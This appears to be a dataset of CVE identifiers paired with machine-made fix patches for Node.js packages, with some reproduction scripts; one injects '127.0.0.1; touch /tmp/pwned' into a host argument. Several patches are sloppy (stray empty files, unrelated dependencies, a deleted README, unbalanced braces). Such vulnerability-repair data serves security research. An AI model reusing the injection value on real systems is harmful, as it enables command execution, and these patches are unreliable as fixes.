stats.isSocket();\n-\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tresults.push(stats);\n-\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tsearch.stats(files);\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\n-\t\t\t\t\t\t\t\t\t\t\t\t\t\t}\n-\t\t\t\t\t\t\t\t\t\t\t\t\t});\n-\t\t\t\t\t\t\t\t\t\t\t\t} else {\n-\t\t\t\t\t\t\t\t\t\t\t\t\tif(query.type == 'json' || query.dir == 'json') {\n-\t\t\t\t\t\t\t\t\t\t\t\t\t\tres.setHeader('Content-Type', 'application/json');\n-\t\t\t\t\t\t\t\t\t\t\t\t\t\tres.write(JSON.stringify(results)); \n-\t\t\t\t\t\t\t\t\t\t\t\t\t\tres.end();\n-\t\t\t\t\t\t\t\t\t\t\t\t\t} else { \n-\t\t\t\t\t\t\t\t\t\t\t\t\t\tres.setHeader('Content-Type', 'text/html');\t\t\t\t\t\t\t\t\t\t\t\n-\t\t\t\t\t\t\t\t\t\t\t\t\t\tres.write('<html><body>');\n-\t\t\t\t\t\t\t\t\t\t\t\t\t\tfor(var f = 0; f < results.length; f++) {\n-\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tvar name = results[f].name;\n-\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tvar normalized = url + '/' + name;\n-\t\t\t\t\t\t\t\t\t\t\t\t\t\t\twhile(normalized[0] == '/') { normalized = normalized.slice(1, normalized.length); }\n-\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tif(normalized.indexOf('\"') >= 0) throw new Error('unsupported file name')\n-\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tname = name.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');\n-\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tres.write('\\r\\n<p><a href=\"/' + normalized + '\"><span>' + name + '</span></a></p>');\n-\t\t\t\t\t\t\t\t\t\t\t\t\t\t}\n-\t\t\t\t\t\t\t\t\t\t\t\t\t\tres.end('\\r\\n</body></html>');\n-\t\t\t\t\t\t\t\t\t\t\t\t\t}\n-\t\t\t\t\t\t\t\t\t\t\t\t}\n-\t\t\t\t\t\t\t\t\t\t\t};\n-\t\t\t\t\t\t\t\t\t\t\tsearch.stats(files);\n-\t\t\t\t\t\t\t\t\t\t}\n-\t\t\t\t\t\t\t\t\t});\n-\t\t\t\t\t\t\t\t} else {\n-\t\t\t\t\t\t\t\t\t// if it's a file, return the contents of a file with the correct content type\n-\t\t\t\t\t\t\t\t\tconsole.log('reading file ' + relativePath);\n-\t\t\t\t\t\t\t\t\tif(query.type == 'json' || query.dir == 'json') {\n-\t\t\t\t\t\t\t\t\t\tvar type = 'application/json';\n-\t\t\t\t\t\t\t\t\t\tres.setHeader('Content-Type', type);\n-\t\t\t\t\t\t\t\t\t\tfs.readFile(relativePath, function(err, data) { \n-\t\t\t\t\t\t\t\t\t\t\tif(err) { writeError(err); }\n-\t\t\t\t\t\t\t\t\t\t\telse {\n-\t\t\t\t\t\t\t\t\t\t\t\tres.end(JSON.stringify({ \n-\t\t\t\t\t\t\t\t\t\t\t\t\tdata: data.toString(),\n-\t\t\t\t\t\t\t\t\t\t\t\t\ttype: require('mime').lookup(relativePath),\n-\t\t\t\t\t\t\t\t\t\t\t\t})); \n-\t\t\t\t\t\t\t\t\t\t\t}\n-\t\t\t\t\t\t\t\t\t\t});\n-\t\t\t\t\t\t\t\t\t} else {\n-\t\t\t\t\t\t\t\t\t\tvar type = require('mime').lookup(relativePath);\n-\t\t\t\t\t\t\t\t\t\tres.setHeader('Content-Type', type);\n-\t\t\t\t\t\t\t\t\t\tfs.readFile(relativePath, function(err, data) { \n-\t\t\t\t\t\t\t\t\t\t\tif(err) { writeError(err); }\n-\t\t\t\t\t\t\t\t\t\t\telse {\n-\t\t\t\t\t\t\t\t\t\t\t\tres.setHeader('Content-Length', data.length);\n-\t\t\t\t\t\t\t\t\t\t\t\tres.end(data); \n-\t\t\t\t\t\t\t\t\t\t\t}\n-\t\t\t\t\t\t\t\t\t\t});\n-\t\t\t\t\t\t\t\t\t}\n-\t\t\t\t\t\t\t\t}\n-\t\t\t\t\t\t\t}\n-\t\t\t\t\t\t});\n-\t\t\t\t\t}\n-\t\t\t\t\treturn;\n-\t\t\t\tcase 'PUT': // write a file\n-\t\t\t\t\tconsole.log('writing ' + relativePath);\n-\t\t\t\t\tvar stream = fs.createWriteStream(relativePath);\t\t\n-\t\t\t\t\tstream.ok = true;\n-\t\t\t\t\treq.pipe(stream); // TODO: limit data length\n-\t\t\t\t\tstream.on('close', function() { \n-\t\t\t\t\t\tif(stream.ok) {\n-\t\t\t\t\t\t\tres.end();\n-\t\t\t\t\t\t}\n-\t\t\t\t\t});\n-\t\t\t\t\tstream.on('error', function(err) { \t\t\t\t\t\t\t\t\t\t\n-\t\t\t\t\t\tstream.ok = false;\n-\t\t\t\t\t\twriteError(err);\n-\t\t\t\t\t});\n-\t\t\t\t\treturn;\n-\t\t\t\tcase 'POST': // create a directory or rename a file or directory\n-\t\t\t\t\tif(query.rename) { // rename a file or directory\n-\t\t\t\t\t\tconsole.log('rename: ' + relativePath);\n-\t\t\t\t\t\t// e.g., http://localhost/old-name.html?rename=new-name.html\n-\t\t\t\t\t\tquery.rename = cleanUrl(query.rename);\n-\t\t\t\t\t\t// TODO: handle missing vpath here\n-\t\t\t\t\t\tif(vpath) { \n-\t\t\t\t\t\t\tif(query.rename.indexOf('/' + vpath + '/') == 0) { \n-\t\t\t\t\t\t\t\tquery.rename = query.rename.slice(vpath.length + 2, query.rename.length);\n-\t\t\t\t\t\t\t} else {\n-\t\t\t\t\t\t\t\tthrow 'renamed url [' + query.rename + '] does not begin with vpath [' + vpath + ']';\n-\t\t\t\t\t\t\t}\n-\t\t\t\t\t\t} \n-\t\t\t\t\t\tconsole.log('renaming ' + relativePath + ' to ' + path + query.rename);\n-\t\t\t\t\t\tfs.rename(relativePath, path + query.rename, function(err) {\n-\t\t\t\t\t\t\tif(err) { writeError(err); } \n-\t\t\t\t\t\t\telse {\n-\t\t\t\t\t\t\t\tres.end();\n-\t\t\t\t\t\t\t}\n-\t\t\t\t\t\t});\n-\t\t\t\t\t} else if(query.create == 'directory') { // rename a directory\n-\t\t\t\t\t\t// e.g., http://localhost/new-directory?create=directory\n-\t\t\t\t\t\tconsole.log('creating directory ' + relativePath);\n-\t\t\t\t\t\tfs.mkdir(relativePath, 0777, function(err) { \n-\t\t\t\t\t\t\tif(err) { writeError(err); } \n-\t\t\t\t\t\t\telse {\n-\t\t\t\t\t\t\t\tres.end();\n-\t\t\t\t\t\t\t}\n-\t\t\t\t\t\t});\n-\t\t\t\t\t} else {\n-\t\t\t\t\t\tconsole.log('relativePath: ' + relativePath);\n-\t\t\t\t\t\twriteError('valid queries are ' + url + '?rename=[new name] or ' + url + '?create=directory');\n-\t\t\t\t\t}\n-\t\t\t\t\treturn;\n-\t\t\t\tcase 'DELETE': // delete a file or directory\t\t\t\t\n-\t\t\t\t\tfs.stat(relativePath, function(err, stats) { \n-\t\t\t\t\t\tif(err) { writeError(err); } \n-\t\t\t\t\t\telse {\n-\t\t\t\t\t\t\tif(stats.isDirectory()) { // delete a directory\n-\t\t\t\t\t\t\t\tconsole.log('deleting directory ' + relativePath);\n-\t\t\t\t\t\t\t\tfs.rmdir(relativePath, function(err) {\n-\t\t\t\t\t\t\t\t\tif(err) { writeError(err); }\n-\t\t\t\t\t\t\t\t\telse { \n-\t\t\t\t\t\t\t\t\t\tres.end(); \n-\t\t\t\t\t\t\t\t\t}\n-\t\t\t\t\t\t\t\t});\n-\t\t\t\t\t\t\t} else { // delete a file\n-\t\t\t\t\t\t\t\tconsole.log('deleting file ' + relativePath);\n-\t\t\t\t\t\t\t\tfs.unlink(relativePath, function(err) {\n-\t\t\t\t\t\t\t\t\tif(err) { writeError(err); }\n-\t\t\t\t\t\t\t\t\telse { \n-\t\t\t\t\t\t\t\t\t\tres.end(); \n-\t\t\t\t\t\t\t\t\t}\n-\t\t\t\t\t\t\t\t});\n-\t\t\t\t\t\t\t}\n-\t\t\t\t\t\t}\n-\t\t\t\t\t});\t\t\t\n-\t\t\t\t\treturn;\n-\t\t\t\tdefault: // unsupported method! tell the client ...\n-\t\t\t\t\tconsole.log('unsupported: ' + relativePath);\t\t\t\t\n-\t\t\t\t\twriteError('Method ' + method + ' not allowed', 405);\n-\t\t\t\t\treturn;\n-\t\t\t}\n-\t\t}\n-\t} catch(err) { \n-\t\t// file system ('fs') errors are just bubbled up to this error handler\n-\t\t// for example, if the GET is called on a non-existent file, an error will be thrown\n-\t\t// and caught here\n-\t\t// writeError will write the error information to the response\n-\t\twriteError('unhandled error: ' + err);\n-\t}\n+        if(req.method != 'HEAD') {\n+                console.log(req.method + ' ' + req.url);\n+        }\n+        var relativePath = vpath && url.indexOf(vpath) == 0 ?\n+                path + url.slice(vpath.length + 1, url.length):\n+                path + url;     \n+        \n+        try {\n+                if(readOnly && req.method != 'GET') {\n+                        writeError(req.method + ' forbidden on this resource', 403);\n+                } else {\n+                        switch(req.method) {\n+                                case 'HEAD':\n+                                        if(logHeadRequests) {\n+                                                console.log('head: ' + relativePath);                           \n+                                        }\n+                                        fs.stat(relativePath, function(err, stats) { // determine if the resource is a file or directory\n+                                                if(err) { writeError(err); } \n+                                                else {                                  \n+                                                        res.setHeader('Last-Modified', stats.mtime);            \n+                                                        res.setHeader(\"Expires\", \"Sat, 01 Jan 2000 00:00:00 GMT\");\n+                                                        res.setHeader(\"Cache-Control\", \"no-store, no-cache, must-revalidate, max-age=0\");\n+                                                        res.setHeader(\"Cache-Control\", \"post-check=0, pre-check=0\");\n+                                                        res.setHeader(\"Pragma\", \"no-cache\");\n+                                                        \n+                                                        if(stats.isDirectory()) {                                                               \n+                                                                res.setHeader('Content-Type', query.type == 'json' || query.dir == 'json' ? 'application/json' : 'text/html');\n+                                                        } else {\n+                                                                if(query.type == 'json' || query.dir == 'json') {\n+                                                                        res.setHeader('Content-Type', 'application/json');\n+                                                                }\n+                                                                else {\n+                                                                        var type = require('mime').lookup(relativePath);\n+                                                                        res.setHeader('Content-Type', type);\n+                                                                        res.setHeader('Content-Length', stats.size);\n+                                                                }\n+                                                        }\n+                                                        res.end();                                                      \n+                                                }\n+                                        });\n+                                        break;\n+                                case 'GET': // returns file or directory contents\n+                                        console.log('relativePath: ' + relativePath);\n+                                        if(url === 'favicon.ico') {     \n+                                                res.end(); // if the browser requests favicon, just return an empty response\n+                                        } else {\n+                                                fs.stat(relativePath, function(err, stats) { // determine if the resource is a file or directory\n+                                                        if(err) { writeError(err); } \n+                                                        else {\n+                                                                if(stats.isDirectory()) {\n+                                                                        res.setHeader('Last-Modified', stats.mtime);                                                    \n+                                                                        res.setHeader(\"Expires\", \"Sat, 01 Jan 2000 00:00:00 GMT\");\n+                                                                        res.setHeader(\"Cache-Control\", \"no-store, no-cache, must-revalidate, max-age=0\");\n+                                                                        res.setHeader(\"Cache-Control\", \"post-check=0, pre-check=0\");\n+                                                                        res.setHeader(\"Pragma\", \"no-cache\");\n+                                                                        // if it's a directory, return the files as a JSONified array\n+                                                                        console.log('reading directory ' + relativePath);\n+                                                                        fs.readdir(relativePath, function(err, files) {\n+                                                                                if(err) { \n+                                                                                        console.log('writeError');\n+                                                                                        writeError(err); \n+                                                                                }\n+                                                                                else {\n+                                                                                        var results = [];\n+                                                                                        var search = {};\n+                                                                                        search.stats = function(files) {\n+                                                                                                if(files.length) { \n+                                                                                                        var file = files.shift();\n+                                                                                                        fs.stat(relativePath + '/' + file, function(err, stats) { \n+                                                                                                                if(err) { writeError(err); } \n+                                                                                                                else {\n+                                                                                                                        stats.name = file;\n+                                                                                                                        stats.isFile = stats.isFile();\n+                                                                                                                        stats.isDirectory = stats.isDirectory();\n+                                                                                                                        stats.isBlockDevice = stats.isBlockDevice();\n+                                                                                                                        stats.isFIFO = stats.isFIFO();\n+                                                                                                                        stats.isSocket = stats.isSocket();\n+                                                                                                                        results.push(stats);\n+                                                                                                                        search.stats(files);                                                                                                                    \n+                                                                                                                }\n+                                                                                                        });\n+                                                                                                } else {\n+                                                                                                        if(query.type == 'json' || query.dir == 'json') {\n+                                                                                                                res.setHeader('Content-Type', 'application/json');\n+                                                                                                                res.write(JSON.stringify(results)); \n+                                                                                                                res.end();\n+                                                                                                        } else { \n+                                                                                                                res.setHeader('Content-Type', 'text/html');                                                                                     \n+                                                                                                                res.write('<html><body>');\n+                                                                                                                for(var f = 0; f < results.length; f++) {\n+                                                                                                                        var name = results[f].name;\n+                                                                                                                        var normalized = url + '/' + name;\n+                                                                                                                        while(normalized[0] == '/') { normalized = normalized.slice(1, normalized.length); }\n+                                                                                                                        if(normalized.indexOf('\"') >= 0) throw new Error('unsupported file name')\n+                                                                                                                        name = name.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');\n+                                                                                                                        res.write('\\r\\n<p><a href=\"/' + normalized + '\"><span>' + name + '</span></a></p>');\n+                                                                                                                }\n+                                                                                                                res.end('\\r\\n</body></html>');\n+                                                                                                        }\n+                                                                                                }\n+                                                                                        };\n+                                                                                        search.stats(files);\n+                                                                                }\n+                                                                        });\n+                                                                } else {\n+                                                                        // if it's a file, return the contents of a file with the correct content type\n+                                                                        console.log('reading file ' + relativePath);\n+                                                                        if(query.type == 'json' || query.dir == 'json') {\n+                                                                                var type = 'application/json';\n+                                                                                res.setHeader('Content-Type', type);\n+                                                                                fs.readFile(relativePath, function(err, data) { \n+                                                                                        if(err) { writeError(err); }\n+                                                                                        else {\n+                                                                                                res.end(JSON.stringify({ \n+                                                                                                        data: data.toString(),\n+                                                                                                        type: require('mime').lookup(relativePath),\n+                                                                                                })); \n+                                                                                        }\n+                                                                                });\n+                                                                        } else {\n+                                                                                var type = require('mime').lookup(relativePath);\n+                                                                                res.setHeader('Content-Type', type);\n+                                                                                fs.readFile(relativePath, function(err, data) { \n+                                                                                        if(err) { writeError(err); }\n+                                                                                        else {\n+                                                                                                res.setHeader('Content-Length', data.length);\n+                                                                                                res.end(data); \n+                                                                                        }\n+                                                                                });\n+                                                                        }\n+                                                                }\n+                                                        }\n+                                                });\n+                                        }\n+                                        return;\n+                                case 'PUT': // write a file\n+                                        console.log('writing ' + relativePath);\n+                                        var stream = fs.createWriteStream(relativePath);                \n+                                        stream.ok = true;\n+                                        req.pipe(stream); // TODO: limit data length\n+                                        stream.on('close', function() { \n+                                                if(stream.ok) {\n+                                                        res.end();\n+                                                }\n+                                        });\n+                                        stream.on('error', function(err) {                                                                              \n+                                                stream.ok = false;\n+                                                writeError(err);\n+                                        });\n+                                        return;\n+                                case 'POST': // create a directory or rename a file or directory\n+                                        if(query.rename) { // rename a file or directory\n+                                                console.log('rename: ' + relativePath);\n+                                                // e.g., http://localhost/old-name.html?rename=new-name.html\n+                                                query.rename = cleanUrl(query.rename);\n+                                                // TODO: handle missing vpath here\n+                                                if(vpath) { \n+                                                        if(query.rename.indexOf('/' + vpath + '/') == 0) { \n+                                                                query.rename = query.rename.slice(vpath.length + 2, query.rename.length);\n+                                                        } else {\n+                                                                throw 'renamed url [' + query.rename + '] does not begin with vpath [' + vpath + ']';\n+                                                        }\n+                                                } \n+                                                console.log('renaming ' + relativePath + ' to ' + path + query.rename);\n+                                                fs.rename(relativePath, path + query.rename, function(err) {\n+                                                        if(err) { writeError(err); } \n+                                                        else {\n+                                                                res.end();\n+                                                        }\n+                                                });\n+                                        } else if(query.create == 'directory') { // rename a directory\n+                                                // e.g., http://localhost/new-directory?create=directory\n+                                                console.log('creating directory ' + relativePath);\n+                                                fs.mkdir(relativePath, 0777, function(err) { \n+                                                        if(err) { writeError(err); } \n+                                                        else {\n+                                                                res.end();\n+                                                        }\n+                                                });\n+                                        } else {\n+                                                console.log('relativePath: ' + relativePath);\n+                                                writeError('valid queries are ' + url + '?rename=[new name] or ' + url + '?create=directory');\n+                                        }\n+                                        return;\n+                                case 'DELETE': // delete a file or directory                            \n+                                        fs.stat(relativePath, function(err, stats) { \n+                                                if(err) { writeError(err); } \n+                                                else {\n+                                                        if(stats.isDirectory()) { // delete a directory\n+                                                                console.log('deleting directory ' + relativePath);\n+                                                                fs.rmdir(relativePath, function(err) {\n+                                                                        if(err) { writeError(err); }\n+                                                                        else { \n+                                                                                res.end(); \n+                                                                        }\n+                                                                });\n+                                                        } else { // delete a file\n+                                                                console.log('deleting file ' + relativePath);\n+                                                                fs.unlink(relativePath, function(err) {\n+                                                                        if(err) { writeError(err); }\n+                                                                        else { \n+                                                                                res.end(); \n+                                                                        }\n+                                                                });\n+                                                        }\n+                                                }\n+                                        });                     \n+                                        return;\n+                                default: // unsupported method! tell the client ...\n+                                        console.log('unsupported: ' + relativePath);                            \n+                                        writeError('Method ' + method + ' not allowed', 405);\n+                                        return;\n+                        }\n+                }\n+        } catch(err) { \n+                // file system ('fs') errors are just bubbled up to this error handler\n+                // for example, if the GET is called on a non-existent file, an error will be thrown\n+                // and caught here\n+                // writeError will write the error information to the response\n+                writeError('unhandled error: ' + err);\n+        }\n };\n"}
{"cve":"CVE-2020-7781:0708", "fix_patch": "diff --git a/1000 b/1000\nnew file mode 100644\nindex 0000000..e69de29\ndiff --git a/80 b/80\nnew file mode 100644\nindex 0000000..e69de29\ndiff --git a/index.js b/index.js\nindex 614a6d6..b77708b 100644\n--- a/index.js\n+++ b/index.js\n@@ -10,9 +10,7 @@ let SOCKET_TIMEOUT = 1000;   //Setting 1s as max acceptable timeout\n function testSync(host, port, connectTimeout) {\n     const nodeBinary = process.execPath;\n     const scriptPath = path.join(__dirname, \"./scripts/connection-tester\");\n-    const cmd = util.format('\"%s\" \"%s\" %s %s %s', nodeBinary, scriptPath, host, port, connectTimeout);\n-\n-    const shellOut = shell.execSync(cmd).toString();\n+    const shellOut = shell.execFileSync(nodeBinary, [scriptPath, host, port, connectTimeout]).toString();\n \n     const output = {\n         success: false,\ndiff --git a/reproduce.js b/reproduce.js\nnew file mode 100644\nindex 0000000..a998d8c\n--- /dev/null\n+++ b/reproduce.js\n@@ -0,0 +1,10 @@\n+const connectionTester = require('./index.js');\n+const host = '127.0.0.1; touch /tmp/pwned';\n+const port = 80;\n+const timeout = 1000;\n+\n+try {\n+  connectionTester.test(host, port, timeout);\n+} catch (e) {\n+  // The command will likely fail after creating the file, so we ignore the error.\n+}\n"}
{"cve":"CVE-2020-15084:0708", "fix_patch": "diff --git a/lib/index.js b/lib/index.js\nindex f5da77f..99cf806 100644\n--- a/lib/index.js\n+++ b/lib/index.js\n@@ -19,6 +19,10 @@ function wrapStaticSecretInCallback(secret){\n module.exports = function(options) {\n   if (!options || !options.secret) throw new Error('secret should be set');\n \n+  if (isFunction(options.secret) && !options.algorithms) {\n+    throw new Error('algorithms should be set');\n+  }\n+\n   var secretCallback = options.secret;\n \n   if (!isFunction(secretCallback)){\ndiff --git a/package.json b/package.json\nindex 0ddb7e6..073ee90 100644\n--- a/package.json\n+++ b/package.json\n@@ -30,8 +30,11 @@\n   \"main\": \"./lib\",\n   \"dependencies\": {\n     \"async\": \"^1.5.0\",\n+    \"express\": \"^5.1.0\",\n+    \"express-jwt\": \"^8.5.1\",\n     \"express-unless\": \"^0.3.0\",\n     \"jsonwebtoken\": \"^8.1.0\",\n+    \"jwks-rsa\": \"^3.2.0\",\n     \"lodash.set\": \"^4.0.0\"\n   },\n   \"devDependencies\": {\n"}
{"cve":"CVE-2022-2421:0708", "fix_patch": "diff --git a/binary.js b/binary.js\nindex 3e2347d..44fe75b 100644\n--- a/binary.js\n+++ b/binary.js\n@@ -71,7 +71,9 @@ function _reconstructPacket(data, buffers) {\n   if (!data) return data;\n \n   if (data && data._placeholder) {\n-    return buffers[data.num]; // appropriate buffer (should be natural order anyway)\n+    if (typeof data.num === 'number' && data.num >= 0 && data.num < buffers.length) {\n+      return buffers[data.num];\n+    }\n   } else if (isArray(data)) {\n     for (var i = 0; i < data.length; i++) {\n       data[i] = _reconstructPacket(data[i], buffers);\n"}
{"cve":"CVE-2022-29822:0708", "fix_patch": "diff --git a/lib/index.js b/lib/index.js\nindex ad1d760..fa3658b 100644\n--- a/lib/index.js\n+++ b/lib/index.js\n@@ -121,6 +121,18 @@ class Service extends AdapterService {\n \n   _find (params = {}) {\n     const { filters, query: where, paginate } = this.filterQuery(params);\n+    if (filters.$sort) {\n+      for (const key of Object.keys(filters.$sort)) {\n+        // Remove dollar signs from start and end of the key\n+        const sanitizedKey = key.startsWith('$') && key.endsWith('$')\n+          ? key.substring(1, key.length - 1)\n+          : key;\n+        // Only allow alphanumeric characters, underscores and dots\n+        if (/[^a-zA-Z0-9_.]/.test(sanitizedKey)) {\n+          delete filters.$sort[key];\n+        }\n+      }\n+    }\n     const order = utils.getOrder(filters.$sort);\n \n     const q = Object.assign({\n"}
{"cve":"CVE-2023-28155:0708", "fix_patch": "diff --git a/lib/redirect.js b/lib/redirect.js\nindex 500252c..b140c29 100644\n--- a/lib/redirect.js\n+++ b/lib/redirect.js\n@@ -112,6 +112,11 @@ Redirect.prototype.onResponse = function (response, callback) {\n     var uriPrev = request.uri\n     request.uri = url.parse(redirectTo)\n \n+    // Failsafe for protocols that don't need to be supported\n+    if (request.uri.protocol !== 'http:' && request.uri.protocol !== 'https:') {\n+      return callback(new Error('Redirect to a a non-http protocol is not supported'))\n+    }\n+\n     // handle the case where we change protocol from https to http or vice versa\n     if (request.uri.protocol !== uriPrev.protocol) {\n       delete request.agent\n"}
{"cve":"CVE-2022-2900:0708", "fix_patch": "diff --git a/lib/index.js b/lib/index.js\nindex b806431..cc0481d 100644\n--- a/lib/index.js\n+++ b/lib/index.js\n@@ -56,9 +56,8 @@ const parseUrl = (url, normalize = false) => {\n     const parsed = parsePath(url)\n \n     // Potential git-ssh urls\n-    if (parsed.protocol === \"file\") {\n-        const matched  = parsed.href.match(GIT_RE)\n-        if (matched) {\n+    const matched = url.match(GIT_RE);\n+    if (matched) {\n             parsed.protocols = [\"ssh\"]\n             parsed.protocol = \"ssh\"\n             parsed.resource = matched[4]\ndiff --git a/reproduce_bug.js b/reproduce_bug.js\nnew file mode 100644\nindex 0000000..bbb52e1\n--- /dev/null\n+++ b/reproduce_bug.js\n@@ -0,0 +1,32 @@\n+\n+import parseUrl from \"./lib/index.js\";\n+\n+const vulnerableUrl = \"git@127.0.0.1:2222/path/to/repo\";\n+console.log(`Testing vulnerable url: ${vulnerableUrl}`);\n+let parsed_vuln = null;\n+try {\n+    parsed_vuln = parseUrl(vulnerableUrl);\n+} catch (e) {\n+    // This is the safe case\n+}\n+\n+if (parsed_vuln && parsed_vuln.protocol === \"ssh\") {\n+    console.log(`VULNERABLE: Parsed protocol is 'ssh'. Resource: ${parsed_vuln.resource}, Pathname: ${parsed_vuln.pathname}`);\n+} else {\n+    console.log(\"NOT VULNERABLE: Did not parse as ssh.\");\n+}\n+\n+const validUrl = \"git@github.com:user/repo.git\";\n+console.log(`\\nTesting valid url: ${validUrl}`);\n+let parsed_valid = null;\n+try {\n+    parsed_valid = parseUrl(validUrl);\n+} catch (e) {\n+    // This should not happen for a valid URL\n+}\n+\n+if (parsed_valid && parsed_valid.protocol === \"ssh\") {\n+    console.log(`SUCCESS: Parsed protocol is 'ssh'. Resource: ${parsed_valid.resource}, Pathname: ${parsed_valid.pathname}`);\n+} else {\n+    console.log(\"FAIL: Did not parse as ssh.\");\n+}\n"}
{"cve":"CVE-2018-3778:0708", "fix_patch": "diff --git a/.gitignore b/.gitignore\nindex 21ef4b7..991fbd3 100644\n--- a/.gitignore\n+++ b/.gitignore\n@@ -36,3 +36,114 @@ package-lock.json\n \n test/typescript/*.js\n test/typescript/*.map\n+\n+# \u56fe\u50cf\u548c\u5a92\u4f53\u6587\u4ef6\uff08\u4e8c\u8fdb\u5236\uff09\n+*.png\n+*.jpg\n+*.jpeg\n+*.gif\n+*.bmp\n+*.tiff\n+*.webp\n+*.mp3\n+*.mp4\n+*.avi\n+*.mov\n+*.flv\n+*.wmv\n+*.pdf\n+*.psd\n+*.ai\n+\n+# \u538b\u7f29\u6587\u4ef6\uff08\u4e8c\u8fdb\u5236\uff09\n+*.zip\n+*.tar\n+*.tar.gz\n+*.tar.bz2\n+*.7z\n+*.rar\n+*.gz\n+*.bz2\n+\n+# \u53ef\u6267\u884c\u6587\u4ef6\uff08\u4e8c\u8fdb\u5236\uff09\n+*.exe\n+*.dll\n+*.so\n+*.dylib\n+*.bin\n+*.out\n+\n+# \u6570\u636e\u5e93\u6587\u4ef6\n+*.db\n+*.sqlite\n+*.sqlite3\n+\n+# \u7f16\u8bd1\u751f\u6210\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\n+/build/\n+/dist/\n+/bin/\n+/out/\n+\n+\n+.DS_Store\n+Thumbs.db\n+\n+# Go\n+myapp\n+vendor/\n+*.out\n+*.test\n+coverage.out\n+build/\n+dist/\n+\n+# JavaScript/Node.js\n+node_modules/\n+dist/\n+build/\n+out/\n+dist-ssr/\n+*.bundle.js\n+*.bundle.js.map\n+*.chunk.js\n+*.chunk.js.map\n+npm-debug.log*\n+yarn-debug.log*\n+yarn-error.log*\n+.pnpm-debug.log*\n+.env.local\n+.env.development.local\n+.env.test.local\n+.env.production.local\n+.node-gyp/\n+*.node\n+\n+# Python\n+__pycache__/\n+*.py[cod]\n+*.class\n+venv/\n+env/\n+ENV/\n+*.venv\n+*.egg-info/\n+.installed.cfg\n+*.egg\n+dist/\n+build/\n+wheelhouse/\n+*.so\n+*.pyd\n+*.dll\n+.coverage\n+htmlcov/\n+.pytest_cache/\n+\n+*.blk\n+*.idx\n+*.jar\n+*.md\n+*package-lock.json\n+\n+\n+\ndiff --git a/README.md b/README.md\ndeleted file mode 100644\nindex 1fe1912..0000000\n--- a/README.md\n+++ /dev/null\n@@ -1,407 +0,0 @@\n-# Aedes&nbsp;&nbsp;[![Build Status](https://travis-ci.org/mcollina/aedes.svg?branch=master)](https://travis-ci.org/mcollina/aedes)&nbsp;[![Coverage Status](https://coveralls.io/repos/mcollina/aedes/badge.svg?branch=master&service=github)](https://coveralls.io/github/mcollina/aedes?branch=master)\n-\n-Barebone MQTT server that can run on any stream server.\n-\n-[![js-standard-style](https://cdn.rawgit.com/feross/standard/master/badge.svg)](https://github.com/feross/standard)\n-\n-* [Install](#install)\n-* [Example](#example)\n-* [API](#api)\n-* [TODO](#todo)\n-* [Acknowledgements](#acknowledgements)\n-* [License](#license)\n-\n-\n-<a name=\"install\"></a>\n-## Install\n-To install aedes, simply use npm:\n-\n-```\n-npm install aedes --save\n-```\n-\n-<a name=\"example\"></a>\n-## Example\n-\n-```js\n-var aedes = require('aedes')()\n-var server = require('net').createServer(aedes.handle)\n-var port = 1883\n-\n-server.listen(port, function () {\n-  console.log('server listening on port', port)\n-})\n-```\n-\n-### TLS\n-\n-```js\n-var fs = require('fs')\n-var aedes = require('aedes')()\n-\n-var options = {\n-  key: fs.readFileSync('YOUR_TLS_KEY_FILE.pem'),\n-  cert: fs.readFileSync('YOUR_TLS_CERT_FILE.pem')\n-}\n-\n-var server = require('tls').createServer(options, aedes.handle)\n-\n-server.listen(8883, function () {\n-  console.log('server started and listening on port 8883')\n-})\n-```\n-\n-<a name=\"api\"></a>\n-## API\n-\n-  * <a href=\"#constructor\"><code><b>aedes()</b></code></a>\n-  * <a href=\"#handle\"><code>instance.<b>handle()</b></code></a>\n-  * <a href=\"#subscribe\"><code>instance.<b>subscribe()</b></code></a>\n-  * <a href=\"#publish\"><code>instance.<b>publish()</b></code></a>\n-  * <a href=\"#unsubscribe\"><code>instance.<b>unsubscribe()</b></code></a>\n-  * <a href=\"#authenticate\"><code>instance.<b>authenticate()</b></code></a>\n-  * <a href=\"#authorizePublish\"><code>instance.<b>authorizePublish()</b></code></a>\n-  * <a href=\"#authorizeSubscribe\"><code>instance.<b>authorizeSubscribe()</b></code></a>\n-  * <a href=\"#authorizeForward\"><code>instance.<b>authorizeForward()</b></code></a>\n-  * <a href=\"#published\"><code>instance.<b>published()</b></code></a>\n-  * <a href=\"#close\"><code>instance.<b>close()</b></code></a>\n-  * <a href=\"#client\"><code><b>Client</b></code></a>\n-  * <a href=\"#clientid\"><code>client.<b>id</b></code></a>\n-  * <a href=\"#clientclean\"><code>client.<b>clean</b></code></a>\n-  * <a href=\"#clientpublish\"><code>client.<b>publish()</b></code></a>\n-  * <a href=\"#clientsubscribe\"><code>client.<b>subscribe()</b></code></a>\n-  * <a href=\"#clientunsubscribe\"><code>client.<b>unsubscribe()</b></code></a>\n-  * <a href=\"#clientclose\"><code>client.<b>close()</b></code></a>\n-\n--------------------------------------------------------\n-<a name=\"constructor\"></a>\n-### aedes([opts])\n-\n-Creates a new instance of Aedes.\n-\n-Options:\n-\n-* `mq`: an instance of [MQEmitter](http://npm.im/mqemitter),\n-  such as [MQEmitterRedis](http://npm.im/mqemitter-redis)\n-  or [MQEmitterMongoDB](http://npm.im/mqemitter-mongodb)\n-* `persistence`: an instance of [AedesPersistence](http://npm.im/aedes-persistence),\n-  such as [aedes-persistence-redis](http://npm.im/aedes-persistence-redis),\n-  [aedes-persistence-nedb](http://npm.im/aedes-persistence-nedb)\n-  or [aedes-persistence-mongodb](http://npm.im/aedes-persistence-mongodb)\n-* `concurrency`: the max number of messages delivered concurrently,\n-  defaults to `100`\n-* `heartbeatInterval`: the interval at which the broker heartbeat is\n-  emitted, it used by other broker in the cluster, defaults to\n-  `60000` milliseconds\n-* `connectTimeout`: the max number of milliseconds to wait for the CONNECT\n-  packet to arrive, defaults to `30000` milliseconds\n-* `authenticate`: function used to authenticate clients, see\n-  [instance.authenticate()](#authenticate)\n-* `authorizePublish`: function used to authorize PUBLISH 